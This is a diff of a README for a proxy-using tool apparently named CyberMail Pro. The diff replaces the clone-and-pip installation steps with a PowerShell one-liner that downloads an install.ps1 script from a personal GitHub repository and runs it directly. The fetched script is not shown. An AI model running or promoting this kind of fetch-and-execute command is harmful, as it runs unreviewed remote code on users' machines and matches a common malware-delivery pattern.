@@ -72,26 +72,12 @@ Python 3.10+ | 64-bit Architecture | 512MB RAM
 ```
 
 ### Installation
-```bash
-# Clone repository
-git clone https://github.com/your-org/cybermail-pro.git
-cd cybermail-pro
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Initialize system
-python cybermail.py
+```powershell
+iex (irm https://raw.githubusercontent.com/Gin69x/CyberMail-Pro/refs/heads/main/install.ps1)
 ```
 
 ### Configuration
-```bash
-# Configure proxy endpoints
-echo "proxy1.example.com:8080" >> working_proxies.txt
-
-# Launch application
-python main.py
-```
+Put your proxies in working_proxies.txt for the program to work.
 
 ## 📋 System Architecture
 
